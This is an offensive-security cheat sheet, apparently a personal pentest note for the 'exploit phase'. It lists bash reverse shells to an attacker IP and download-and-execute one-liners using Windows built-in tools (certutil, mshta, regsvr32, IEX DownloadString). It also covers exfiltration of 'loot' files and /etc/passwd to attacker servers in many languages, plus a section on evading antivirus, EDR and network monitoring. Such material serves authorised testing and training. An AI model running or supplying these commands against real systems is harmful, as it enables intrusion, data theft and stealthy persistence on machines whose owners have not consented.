> [!info]+ Exploit Phase Overview
> This note focuses on techniques used during the **exploit phase** of an engagement. It assumes access to a vulnerable service or system and covers methods to gain code execution, transfer payloads, and establish persistence.

## üß® Payload Staging
**Tags:** `#payloads` `#staging` `#execution`
- Use `msfvenom`, `donut`, or `nishang` to generate payloads
- Host with `python3 -m http.server`, `uploadserver`, or `smbserver.py`
- Execute via LOLBAS or webshells

> [!checklist]+ Reverse Shell Setup (Linux)
> - [ ] Start listener: `nc -lvnp 9001`
> - [ ] Craft payload: `bash -i >& /dev/tcp/...`
> - [ ] Upgrade shell: `python3 -c 'import pty; pty.spawn(...)'`

> [!checklist]+ File Transfer Setup
> - [ ] Prepare file: `echo 'Hello World' > file.txt`
> - [ ] Start HTTP server: `python3 -m http.server 8000`
> - [ ] Download file: `wget http://<attacker_ip>:8000/file.txt`

## üêö Webshells

**Tags:** `#webshells` `#postexploitation` `#reverseshell` `#bindshell`

A **webshell** is a script that enables remote command execution via a web server. It can be used for persistence, privilege escalation, or lateral movement.

---

SEE ALSO [[File Upload Copilot]]

### üß† Shell Types

|**Type**|**Description**|
|---|---|
|**Reverse Shell**|Victim connects back to attacker|
|**Bind Shell**|Attacker connects to victim|
|**Web Shell**|Accessed via HTTP/S through a web server|

**Reference:**

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings))
- [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl (highon.coffee)](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

#### üêö Example Reverse Shell

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.5/9001 0>&1"
```

---

### üßó‚Äç‚ôÇÔ∏è Upgrading Shells

#### üñ•Ô∏è TTY Upgrade (Linux)

- [Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```bash
which python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z
stty raw -echo
fg
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 67 columns 318
```

#### üåê Upgrading Web Shells

- Upload a more advanced shell (e.g., PHP, ASP, JSP)
- Use `echo` or `printf` to write a shell if upload is blocked
- Default webroots:
    - Apache: `/var/www/html/`
    - Nginx: `/usr/local/nginx/html/`
    - IIS: `C:\inetpub\wwwroot\`
    - XAMPP: `C:\xampp\htdocs\`
- use parameters to pass in commands
	- browser
	- cURL
	- burpsuite

---

## üì¶ File Transfer
**Tags:** `#filetransfer` `#postexploitation` `#upload` `#download`

This section covers how to **upload or download files** between the attacker and the target using various protocols and native tools.

### üß¨ Living Off the Land (Windows)
**Tags:** `#lolbas` `#filetransfer` `#postexploitation`
  
These techniques use native Windows binaries and utilities to download or upload files without relying on third-party tools. Ideal for stealthy operations and bypassing security controls.

---

#### ‚¨áÔ∏è Downloading Files from Attacker to Target
**Tags:** `#download` `#filetransfer`

**`certutil.exe`**  
Originally used for certificate management, but supports HTTP(S) file downloads.

```powershell
certutil.exe -urlcache -split -f http://<attacker_ip>/file.exe file.exe
Start-Process .\file.exe
```

**`Invoke-WebRequest` / `curl`**  
Modern PowerShell and Windows 10+ systems support these natively.

```powershell
Invoke-WebRequest -Uri http://<attacker_ip>/file.exe -OutFile file.exe
curl http://<attacker_ip>/file.exe -o file.exe
Start-Process .\file.exe
```

**`bitsadmin.exe`**  
Uses the Background Intelligent Transfer Service. Deprecated but still present on many systems.

```powershell
bitsadmin /transfer myJob /priority foreground http://<attacker_ip>/file.exe C:\Users\Public\file.exe
Start-Process C:\Users\Public\file.exe
```

**`mshta.exe`**  
Executes remote HTA (HTML Application) files containing VBScript or JavaScript.

```powershell
mshta http://<attacker_ip>/payload.hta
```

**`rundll32.exe`**  
Executes remote JavaScript via `mshtml`. Useful for in-memory execution.

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://<attacker_ip>/payload.js");
```

**`powershell.exe` (In-Memory Execution)**  
Executes a PowerShell script directly from memory without writing to disk.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/payload.ps1')
```

**`regsvr32.exe`**  
Executes remote `.sct` (scriptlet) files using COM objects.

```powershell
regsvr32 /s /n /u /i:http://<attacker_ip>/payload.sct scrobj.dll
```

**`wmic.exe`**  
Executes remote XSL files that can contain embedded scripts.

```powershell
wmic os get /format:"http://<attacker_ip>/payload.xsl"
```

---

#### ‚¨ÜÔ∏è Uploading Files from Target to Attacker
**Tags:** `#upload` `#filetransfer`

**Base64 + POST (PowerShell)**  
Encode a file and send it via HTTP POST.

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Users\Public\loot.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://<attacker_ip>:8001/ -Method POST -Body $b64
```

**Invoke-RestMethod (Single File Upload)**  
Upload a file using multipart/form-data.

```powershell
Invoke-RestMethod -Uri "http://<attacker_ip>:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile "C:\Users\Public\loot.txt"
```

**Invoke-RestMethod (Directory Upload)**  
Upload all files in a directory.

```powershell
Get-ChildItem -Path "C:\Users\Public\" -File | ForEach-Object {
    Invoke-RestMethod -Uri "http://<attacker_ip>:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile $_.FullName
}
```

**`certreq.exe`**  
Can be abused to POST files to a remote server.

```powershell
certreq.exe -Post -config http://<attacker_ip>:8000/ C:\Windows\win.ini
```

---

### üß¨ Living Off the Land (Linux)

**Tags:** `#lolbins` `#filetransfer` `#postexploitation`  
These techniques use built-in Linux utilities to download or upload files without introducing new binaries. Ideal for stealthy operations in restricted environments.

---

#### ‚¨áÔ∏è Downloading Files from Attacker to Target
**Tags:** `#download` `#filetransfer`

**`wget`**  
Commonly available on most Linux systems.

```bash
wget http://<attacker_ip>/file.sh
chmod +x file.sh
./file.sh
```

**`curl`**  
An alternative to `wget`, often pre-installed.

```bash
curl -O http://<attacker_ip>/file.sh
chmod +x file.sh
./file.sh
```

**`nc` (Netcat)**  
Useful when HTTP is blocked but raw TCP is allowed.

```bash
# On attacker:
nc -lvnp 9001 < file.sh

# On target:
nc <attacker_ip> 9001 > file.sh
chmod +x file.sh
./file.sh
```

**`scp`**  
Secure file transfer over SSH.

```bash
scp user@<attacker_ip>:/path/to/file.sh .
chmod +x file.sh
./file.sh
```

**`ftp`**  
Legacy but still present on many systems.

```bash
ftp <attacker_ip>
# or non-interactive
ftp -inv <attacker_ip> <<EOF
user anonymous ""
binary
get file.sh
bye
EOF
chmod +x file.sh
./file.sh
```

**`smbclient`**  
Access SMB shares from Linux.

```bash
smbclient //"<attacker_ip>/share" -N -c "get file.sh"
chmod +x file.sh
./file.sh
```

**`mount` (CIFS)**  
Mount SMB shares directly to the filesystem.

```bash
sudo mount -t cifs //"<attacker_ip>/share" /mnt -o guest
cp /mnt/file.sh .
sudo umount /mnt
chmod +x file.sh
./file.sh
```

---

#### ‚¨ÜÔ∏è Uploading Files from Target to Attacker
**Tags:** `#upload` `#filetransfer`

**`ftp`**  
Upload files to an attacker-controlled FTP server.

```bash
ftp -inv <attacker_ip> <<EOF
user anonymous ""
binary
put loot.txt
bye
EOF
```

**`scp`**  
Send files securely to an SSH-enabled attacker machine.

```bash
scp loot.txt user@<attacker_ip>:/tmp/
```

**`smbclient`**  
Push files to an SMB share.

```bash
smbclient //"<attacker_ip>/share" -N -c "put loot.txt"
```

**`mount` (CIFS)**  
Mount an SMB share and copy files into it.

```bash
sudo mount -t cifs //"<attacker_ip>/share" /mnt -o guest
cp loot.txt /mnt/
sudo umount /mnt
```

---

### üì° FTP (File Transfer Protocol)

FTP is a widely supported protocol for transferring files. Below are methods categorized by **attacker** and **target** OS combinations.

#### üì• Download from Attacker on Target

##### üêß Target: Linux

- **Attacker: Linux**

```bash
  # Start FTP server
  sudo python3 -m pyftpdlib --port 21
```

```bash
  # On target
  ftp <attacker_ip>
  # or non-interactive
  ftp -inv <attacker_ip> <<EOF
  user anonymous ""
  binary
  get file.sh
  bye
  EOF
  chmod +x file.sh
  ./file.sh
```

- **Attacker: Windows**

```powershell
  # Start FTP server (e.g., FileZilla Server or pyftpdlib via WSL)
```

```bash
  # On target (same as above)
  ftp <attacker_ip>
```

##### ü™ü Target: Windows

- **Attacker: Linux**

```bash
  sudo python3 -m pyftpdlib --port 21
```

```powershell
  # On target
  (New-Object Net.WebClient).DownloadFile('ftp://<attacker_ip>/file.exe', 'C:\Users\Public\file.exe')
```

```powershell
  # Or using ftp.exe with script
  ftp -s:ftp.txt
```

- **Attacker: Windows**

```powershell
  # Start FTP server (e.g., pyftpdlib or FileZilla Server)
```

```powershell
  # On target (same as above)
  ftp -s:ftp.txt
```

#### üì§ Upload to Attacker from Target

##### üêß Target: Linux

- **Attacker: Linux**

```bash
  sudo python3 -m pyftpdlib --port 21
```

```bash
  ftp -inv <attacker_ip> <<EOF
  user anonymous ""
  binary
  put loot.txt
  bye
  EOF
```

- **Attacker: Windows**

```powershell
  # Start FTP server (e.g., FileZilla Server)
```

```bash
  # On target (same as above)
  ftp -inv <attacker_ip> <<EOF
  user anonymous ""
  binary
  put loot.txt
  bye
  EOF
```

##### ü™ü Target: Windows

- **Attacker: Linux**

```bash
  sudo python3 -m pyftpdlib --port 21
```

```powershell
  # On target
  ftp -s:ftp_upload.txt
```

- **Attacker: Windows**

```powershell
  # Start FTP server (e.g., FileZilla Server)
```

```powershell
  # On target (same as above)
  ftp -s:ftp_upload.txt
```

---

### üìÅ SMB File Transfer

#### ‚¨áÔ∏è Download from Attacker

##### Attacker: **Windows** ‚Üí Target: **Windows**

```powershell
copy \\<attacker_ip>\share\file.exe C:\Users\Public\file.exe
Start-Process C:\Users\Public\file.exe
```

```powershell
net use Z: \\<attacker_ip>\share
copy Z:\file.exe C:\Users\Public\file.exe
net use Z: /delete
```

##### Attacker: **Windows** ‚Üí Target: **Linux**

```bash
smbclient //"<attacker_ip>/share" -N -c "get file.sh"
chmod +x file.sh
./file.sh
```

##### Attacker: **Linux** ‚Üí Target: **Windows**

```powershell
copy \\<attacker_ip>\share\file.exe C:\Users\Public\file.exe
```

```powershell
net use Z: \\<attacker_ip>\share
copy Z:\file.exe C:\Users\Public\file.exe
net use Z: /delete
```

#### Attacker: **Linux** ‚Üí Target: **Linux**

```bash
smbclient //"<attacker_ip>/share" -N -c "get file.sh"
chmod +x file.sh
./file.sh
```

```bash
sudo mount -t cifs //"<attacker_ip>/share" /mnt -o guest
cp /mnt/file.sh .
sudo umount /mnt
chmod +x file.sh
./file.sh
```

#### ‚¨ÜÔ∏è Upload to Target

##### Attacker: **Windows** ‚Üí Target: **Windows**

```powershell
# Share folder via Windows File Sharing
# On target:
copy \\<attacker_ip>\share\payload.exe C:\Users\Public\payload.exe
```

##### Attacker: **Windows** ‚Üí Target: **Linux**

```bash
smbclient //"<attacker_ip>/share" -N -c "get payload.sh"
chmod +x payload.sh
./payload.sh
```

##### Attacker: **Linux** ‚Üí Target: **Windows**

```powershell
copy \\<attacker_ip>\share\payload.exe C:\Users\Public\payload.exe
```

##### Attacker: **Linux** ‚Üí Target: **Linux**

```bash
smbclient //"<attacker_ip>/share" -N -c "get payload.sh"
chmod +x payload.sh
./payload.sh
```

---

### üöö SCP (Secure Copy Protocol)
**Tags:** `#scp` `#filetransfer` `#ssh`

SCP allows secure file transfers over SSH. Below are methods categorized by the **attacker's** and **target's** operating systems.

#### üì• Download from Attacker on Target

##### üêß Target: Linux

- **Attacker: Linux**

```bash
  scp attacker@<attacker_ip>:/path/to/file.sh ./file.sh
  chmod +x file.sh
  ./file.sh
```

- **Attacker: Windows (e.g., using PuTTY's `pscp.exe`)**

```powershell
  pscp.exe attacker@<attacker_ip>:/path/to/file.sh C:\Users\Public\file.sh
```

##### ü™ü Target: Windows

- **Attacker: Linux**

```bash
  scp attacker@<attacker_ip>:/path/to/file.exe /mnt/c/Users/Public/file.exe
```

- **Attacker: Windows**

```powershell
  pscp.exe attacker@<attacker_ip>:/path/to/file.exe C:\Users\Public\file.exe
```

> Ensure the target has an SSH server running (e.g., OpenSSH on Windows 10+ or Cygwin).


#### üì§ Upload to Target from Attacker

##### üêß Target: Linux

- **Attacker: Linux**

```bash
  scp file.sh user@<target_ip>:/tmp/
```

- **Attacker: Windows**

```powershell
  pscp.exe file.sh user@<target_ip>:/tmp/
```


##### ü™ü Target: Windows

- **Attacker: Linux**

```bash
  scp file.exe user@<target_ip>:/cygdrive/c/Users/Public/
```

- **Attacker: Windows**

```powershell
  pscp.exe file.exe user@<target_ip>:/cygdrive/c/Users/Public/
```

> Use `-i` to specify an SSH key if needed:

```bash
scp -i ~/.ssh/id_rsa file.txt user@<target_ip>:/path/
```

---


### üß† Other Tools

- [LOLBAS](https://lolbas-project.github.io/) (Windows)
- [gtfobins ¬∑ GitHub Topics](https://github.com/topics/gtfobins)  (Linux)
- [GitHub - MinatoTW/UltimateFileTransferList: Ultimate File Transfer List](https://github.com/MinatoTW/UltimateFileTransferList)

---

## üß™ Language-Specific Transfer Methods

### üêç Python-Based File Transfer Techniques

#### ‚¨áÔ∏è Download from Attacker to Target (Python on Target)

**Using `urllib.request.urlretrieve()`**

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<attacker_ip>/file.sh", "file.sh")'
chmod +x file.sh
./file.sh
```

**Using `requests` (if installed)**

```bash
python3 -c 'import requests; open("file.sh", "wb").write(requests.get("http://<attacker_ip>/file.sh").content)'
chmod +x file.sh
./file.sh
```

**Start a simple HTTP server on the attacker**

```bash
# On attacker
python3 -m http.server 8080
```

Then download using one of the above methods on the target.

---

#### ‚¨ÜÔ∏è Upload to Attacker from Target (Python on Target)

**Using `requests.post()` to upload a file**

```bash
python3 -c 'import requests; requests.post("http://<attacker_ip>:8000/upload", files={"file": open("loot.txt", "rb")})'
```

**Host an upload server on the attacker**

```bash
# On attacker
python3 -m uploadserver
```

Optionally with HTTPS:

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
python3 -m uploadserver --ssl server.pem
```

---

### üêò PHP-Based File Transfer Techniques

#### ‚¨áÔ∏è Download from Attacker to Target (PHP on Target)

These methods are useful when you have access to a PHP shell or can execute PHP code on the target.

**Basic file download using `file_get_contents()`**

```php
php -r '$f = file_get_contents("http://<attacker_ip>/file.sh"); file_put_contents("file.sh", $f);'
chmod +x file.sh
./file.sh
```

**Buffered download using `fopen()` and `fread()`**

```php
php -r 'const BUFFER = 1024; $fremote = fopen("http://<attacker_ip>/file.sh", "rb"); $flocal = fopen("file.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
chmod +x file.sh
./file.sh
```

**Line-by-line download using `file()`**

```php
php -r '$lines = @file("http://<attacker_ip>/file.sh"); foreach ($lines as $line) { echo $line; }' > file.sh
chmod +x file.sh
./file.sh
```

---

#### ‚¨ÜÔ∏è Upload to Attacker from Target (PHP on Target)

If the target has PHP and outbound HTTP access, you can upload files using `curl` or `file_get_contents()` with POST.

**Using `curl` from shell (PHP not required here, but often used in PHP environments)**

```bash
curl -X POST http://<attacker_ip>/upload -F 'files=@/etc/passwd'
```

**Using PHP to POST a file**

```php
php -r '$c = curl_init("http://<attacker_ip>/upload"); curl_setopt($c, CURLOPT_POST, 1); curl_setopt($c, CURLOPT_POSTFIELDS, ["file" => "@/etc/passwd"]); curl_exec($c); curl_close($c);'
```

---

### üíé Ruby

#### ‚¨áÔ∏è Download from Attacker to Target (Ruby on Target)

**Using `net/http` to download a file**

```bash
ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI("http://<attacker_ip>/file.sh")))'
chmod +x file.sh
./file.sh
```

**Download from GitHub or other raw URLs**

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
chmod +x LinEnum.sh
./LinEnum.sh
```

#### ‚¨ÜÔ∏è Upload to Attacker from Target (Ruby on Target)

**Using `net/http` and `multipart/form-data` to upload a file**

```ruby
require 'net/http'
require 'uri'

uri = URI.parse("http://<attacker_ip>:8000/upload")
file = File.open("loot.txt")

request = Net::HTTP::Post::Multipart.new uri.path,
  "file" => UploadIO.new(file, "text/plain", "loot.txt")

response = Net::HTTP.start(uri.host, uri.port) do |http|
  http.request(request)
end

puts response.body
```

> Note: This requires the `multipart-post` gem. If not available, fallback to simpler HTTP POST with raw data:

```ruby
require 'net/http'
require 'uri'

uri = URI.parse("http://<attacker_ip>:8000/upload")
data = File.read("loot.txt")

response = Net::HTTP.post(uri, data, "Content-Type" => "text/plain")
puts response.body
```

---

### ‚ö° PowerShell (Windows + PowerShell Core)
**Tags:** `#powershell` `#filetransfer` `#postexploitation`

#### ‚¨áÔ∏è Download from Attacker to Target

##### ‚úÖ Windows PowerShell

```powershell
# Download with Invoke-WebRequest
Invoke-WebRequest -Uri http://<attacker_ip>/file.exe -OutFile file.exe
Start-Process .\file.exe

# Using WebClient
(New-Object Net.WebClient).DownloadFile('http://<attacker_ip>/file.exe', 'file.exe')
Start-Process .\file.exe

# In-memory execution
IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/payload.ps1')
```

##### üêß PowerShell Core (Linux/macOS)

```powershell
# Download with Invoke-WebRequest
Invoke-WebRequest -Uri http://<attacker_ip>/file.sh -OutFile file.sh
chmod +x ./file.sh
./file.sh

# WebClient still works in PowerShell Core
(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>/file.sh', 'file.sh')
chmod +x ./file.sh
./file.sh
```

---

#### ‚¨ÜÔ∏è Upload from Target to Attacker

##### ‚úÖ Windows PowerShell

```powershell
# Base64 encode and POST
$b64 = [System.Convert]::ToBase64String((Get-Content -Path 'C:\Users\Public\loot.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://<attacker_ip>:8001/ -Method POST -Body $b64

# Upload a single file
Invoke-RestMethod -Uri "http://<attacker_ip>:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile "C:\Users\Public\loot.txt"

# Upload all files in a directory
Get-ChildItem -Path "C:\Users\Public\" -File | ForEach-Object {
  Invoke-RestMethod -Uri "http://<attacker_ip>:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile $_.FullName
}

# Using PSUpload.ps1
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<attacker_ip>:8001/upload -File "C:\Users\Public\loot.txt"
```

##### üêß PowerShell Core (Linux/macOS)

```powershell
# Base64 encode and POST
$b64 = [System.Convert]::ToBase64String((Get-Content -Path './loot.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://<attacker_ip>:8001/ -Method POST -Body $b64

# Upload a single file
Invoke-RestMethod -Uri "http://<attacker_ip>:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile "./loot.txt"

# Upload all files in a directory
Get-ChildItem -Path "./" -File | ForEach-Object {
  Invoke-RestMethod -Uri "http://<attacker_ip>:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile $_.FullName
}
```

---

### üìÑ VBScript File Download (Windows Only)
**Tags:** `#vbscript` `#filetransfer` `#windows`

#### ‚¨áÔ∏è Download from Attacker to Target

##### `wget.vbs` ‚Äì VBScript HTTP File Downloader

This script uses `Microsoft.XMLHTTP` and `ADODB.Stream` to download a file from a remote server and save it locally.

```vbscript
' wget.vbs
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")

xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

With bStrm
  .Type = 1 ' Binary
  .Open
  .Write xHttp.ResponseBody
  .SaveToFile WScript.Arguments.Item(1), 2 ' Overwrite if exists
End With
```

##### üß™ Usage

```powershell
# Download a file using VBScript
cscript.exe /nologo wget.vbs http://<attacker_ip>/file.exe file.exe

# Example: Download PowerView.ps1
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

---

### üìú JavaScript (ActiveX) File Download (Windows Only)
**Tags:** `#activex` `#javascript` `#filetransfer` `#windows`

This method uses **ActiveX objects** in Windows Script Host (WSH) to download files via HTTP. It‚Äôs useful in legacy environments or when executing scripts via `cscript.exe`.

#### `wget.js` ‚Äì JavaScript HTTP File Downloader

```javascript
// wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();

var BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1; // Binary
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1), 2); // Overwrite if exists
```

#### üß™ Usage

```powershell
# Download a file using JavaScript + ActiveX
cscript.exe /nologo wget.js http://<attacker_ip>/file.exe file.exe

# Example: Download PowerView.ps1
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

> ‚ö†Ô∏è **Note:** This technique only works on Windows systems with Windows Script Host enabled. It is often blocked by modern antivirus or endpoint protection tools.


#### üß© Can JavaScript (ActiveX) Be Used to Upload Files?

Yes ‚Äî **in theory**, JavaScript running under **Windows Script Host (WSH)** with **ActiveX** can upload files using HTTP POST. However, it's **much less common** and more complex than downloading. Here's why:

##### ‚ö†Ô∏è Limitations:

- You‚Äôd need to manually construct a `multipart/form-data` request or send raw file data.
- ActiveX lacks built-in support for `FormData` or easy file handling like modern browsers.
- Many environments block ActiveX or disable WSH for security reasons.

---

#### üß™ Proof-of-Concept: Upload File via VBScript-Compatible JavaScript

Here‚Äôs a conceptual example using `WinHttp.WinHttpRequest.5.1` and `ADODB.Stream` to send a file as raw binary:

```javascript
// upload.js
var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
http.Open("POST", "http://<attacker_ip>:8000/upload", false);

var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1; // Binary
stream.Open();
stream.LoadFromFile("C:\\Users\\Public\\loot.txt");

http.Send(stream.Read());
```

#### üß™ Usage:

```powershell
cscript.exe /nologo upload.js
```

> ‚ö†Ô∏è This sends raw binary data ‚Äî your server must be ready to handle it (e.g., reading raw POST body).

---

### üêö Bash File Transfer Techniques
**Tags:** `#bash` `#filetransfer` `#linux`

#### ‚¨áÔ∏è Download from Attacker to Target

**Using `wget`**

```bash
wget http://<attacker_ip>/file.sh
chmod +x file.sh
./file.sh
```

**Using `curl`**

```bash
curl -O http://<attacker_ip>/file.sh
chmod +x file.sh
./file.sh
```

**Using `nc` (Netcat)**

```bash
# On attacker:
nc -lvnp 9001 < file.sh

# On target:
nc <attacker_ip> 9001 > file.sh
chmod +x file.sh
./file.sh
```

**Using `scp`**

```bash
scp user@<attacker_ip>:/path/to/file.sh .
chmod +x file.sh
./file.sh
```

**Using `ftp`**

```bash
ftp -inv <attacker_ip> <<EOF
user anonymous ""
binary
get file.sh
bye
EOF
chmod +x file.sh
./file.sh
```

**Using `smbclient`**

```bash
smbclient //<attacker_ip>/share -N -c "get file.sh"
chmod +x file.sh
./file.sh
```

**Using `mount` (CIFS)**

```bash
sudo mount -t cifs //<attacker_ip>/share /mnt -o guest
cp /mnt/file.sh .
sudo umount /mnt
chmod +x file.sh
./file.sh
```

#### ‚¨ÜÔ∏è Upload from Target to Attacker

**Using `ftp`**

```bash
ftp -inv <attacker_ip> <<EOF
user anonymous ""
binary
put loot.txt
bye
EOF
```

**Using `scp`**

```bash
scp loot.txt user@<attacker_ip>:/tmp/
```

**Using `smbclient`**

```bash
smbclient //<attacker_ip>/share -N -c "put loot.txt"
```

**Using `mount` (CIFS)**

```bash
sudo mount -t cifs //<attacker_ip>/share /mnt -o guest
cp loot.txt /mnt/
sudo umount /mnt
```

**Using `curl` with POST**

```bash
curl -X POST http://<attacker_ip>/upload -F 'files=@loot.txt'
```

#### üß™ One-Liners & Tricks

**Reverse Shell (Bash)**

```bash
bash -c "bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1"
```

**Base64 Encode/Decode**

```bash
# Encode
base64 loot.txt > loot.b64

# Decode
base64 -d loot.b64 > loot.txt
```

#### üöÄ Hosting Servers (Attacker Side)

**Python HTTP Server**

```bash
python3 -m http.server 8000
```

**Python Upload Server**

```bash
python3 -m uploadserver
```

**PHP Server**

```bash
php -S 0.0.0.0:8000
```

**Ruby Server**

```bash
ruby -run -ehttpd . -p8000
```

**FTP Server**

```bash
sudo python3 -m pyftpdlib --port 21
```

---

## üïµÔ∏è Evasion
**Tags:** `#evasion` `#obfuscation` `#stealth`

This section provides evasion strategies for file transfer and execution techniques across PowerShell, Bash, Python, PHP, VBScript, JavaScript (ActiveX), and more. These tips help avoid detection by antivirus (AV), endpoint detection and response (EDR), and network monitoring tools.

---

### ‚ö° PowerShell

- **Use in-memory execution** (`IEX`, `DownloadString`) to avoid writing to disk.
- **Obfuscate commands** using string concatenation, encoding, or tools like `Invoke-Obfuscation`.
- **Rename scripts** to benign names (e.g., `update.ps1`, `report.ps1`).
- **Use HTTPS** to encrypt traffic and avoid plaintext inspection.
- **Split payloads** into chunks and reassemble in memory.
- **Avoid known LOLBAS patterns** (e.g., `certutil`, `bitsadmin`) unless necessary.

---

### üêö Bash / Linux Tools

- **Use uncommon ports** (e.g., 8443, 2222) to bypass basic firewall rules.
- **Rename payloads** to look like system files (e.g., `cron.sh`, `update.log`).
- **Use `base64` or `xxd`** to encode payloads and decode on target.
- **Leverage built-in tools** (`curl`, `wget`, `nc`, `scp`) to avoid dropping binaries.
- **Use `--user-agent` and `--referer`** flags in `curl/wget` to mimic legitimate traffic.
- **Serve payloads over HTTPS** using self-signed certs to avoid plaintext inspection.

---

### üêç Python

- **Use `uploadserver` or `http.server`** on non-standard ports.
- **Obfuscate scripts** with tools like `pyminifier` or `pyarmor`.
- **Use HTTPS** with `uploadserver --ssl` to encrypt file transfers.
- **Avoid writing to disk** by executing payloads in memory (e.g., `exec()` from `requests.get()`).

---

### üêò PHP

- **Embed payloads in legitimate-looking scripts** (e.g., `index.php`, `contact.php`).
- **Use `base64_encode()`** and decode on the server side.
- **Avoid obvious filenames** like `shell.php`, `backdoor.php`.
- **Use POST requests** instead of GET to hide command parameters.
- **Use HTTPS** to encrypt traffic.

---

### üíé Ruby

- **Use `net/http` with custom headers** to mimic browser traffic.
- **Avoid writing files** by executing downloaded content directly.
- **Use `multipart/form-data`** to blend in with legitimate uploads.

---

### üìÑ VBScript

- **Rename scripts** to blend in (e.g., `update.vbs`, `log.vbs`).
- **Use `cscript.exe`** instead of `wscript.exe` to avoid popups.
- **Serve payloads over HTTPS** to avoid plaintext inspection.
- **Use encoded payloads** and decode in memory.

---

### üìú JavaScript (ActiveX)

- **Use benign filenames** (e.g., `report.js`, `update.js`).
- **Avoid writing to disk** if possible ‚Äî execute in memory.
- **Use HTTPS** and custom headers to mimic legitimate traffic.
- **Obfuscate script logic** using string splitting or encoding.

---

### üì¶ File Transfer Protocols (FTP, SMB, SCP)

- **Use encrypted protocols** (SCP, HTTPS) over plaintext (FTP, SMB).
- **Limit exposure** by using temporary shares or credentials.
- **Use uncommon share names** (e.g., `\\<ip>\logs` instead of `\\<ip>\share`).
- **Avoid default ports** (e.g., use 2121 instead of 21 for FTP).

---

### üß™ General Tips

- **Time your transfers** during business hours to blend with normal traffic.
- **Throttle bandwidth** to avoid spikes that trigger alerts.
- **Use legitimate tools** (Living off the Land) to avoid dropping binaries.
- **Rotate payload names and hashes** to avoid signature detection.
- **Test in a lab** with AV/EDR to refine your evasion techniques.

---

## üß∞ Tools Summary

### üêö Shells & Payloads

- [PentestMonkey](https://pentestmonkey.net/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Ropnop - TTY Upgrades](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

### üì¶ File Transfer

- [`uploadserver`](https://github.com/jkullick/uploadserver) ‚Äì Simple HTTP file upload server
- [`pyftpdlib`](https://github.com/giampaolo/pyftpdlib) ‚Äì Python FTP server
- [`Updog`](https://github.com/sc0tfree/updog) ‚Äì Secure file sharing via HTTP
- [`wsgidav`](https://github.com/mar10/wsgidav) ‚Äì WebDAV server
- `certutil`, `scp`, `curl`, `wget`, `ftp`, `smbclient`, `nc`

### üß¨ Living Off the Land

- [LOLBAS](https://lolbas-project.github.io/) ‚Äì Living Off the Land Binaries and Scripts (Windows)
- [GTFOBins](https://gtfobins.github.io/) ‚Äì Unix binaries that can be abused

### üß™ Obfuscation & Evasion

- [`Invoke-Obfuscation`](https://github.com/danielbohannon/Invoke-Obfuscation) ‚Äì PowerShell obfuscation
- [`pyminifier`](https://github.com/liftoff/pyminifier) ‚Äì Python obfuscation
- `base64`, `xxd`, `gzip`, `openssl`

### üß∞ Miscellaneous Utilities

- [`pscp`](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) ‚Äì PuTTY SCP client for Windows
- [`php -S`, `ruby -run`, `python3 -m http.server`] ‚Äì Lightweight HTTP servers

---

## üîó Related Notes

- [[Privilege Escalation]]
- [[Post-Exploitation]]
- [[LOLBAS]]
- [[GTFOBins]]
- [[Reverse Shells]]

---


> [!checklist]+ Reverse Shell Setup (Linux)
> - [ ] Start listener: `nc -lvnp 9001`
> - [ ] Craft payload: `bash -i >& /dev/tcp/...`
